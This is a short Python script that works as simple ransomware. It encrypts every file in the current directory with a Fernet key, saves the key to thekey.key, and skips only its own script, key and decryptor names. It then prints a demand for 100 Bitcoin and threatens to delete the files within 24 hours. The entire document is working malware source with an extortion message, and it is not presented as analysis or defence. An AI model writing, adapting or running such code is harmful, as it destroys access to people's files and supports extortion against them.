import os
from cryptography.fernet import Fernet



files = []

for file in os.listdir():
	if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py" or file== "ransome.exe" or file == "decrypt.exe":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)


for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("your all files has been encrypted !! Send me 100 Bitcoin or I'll delete them in 24 hours !!!")

input()
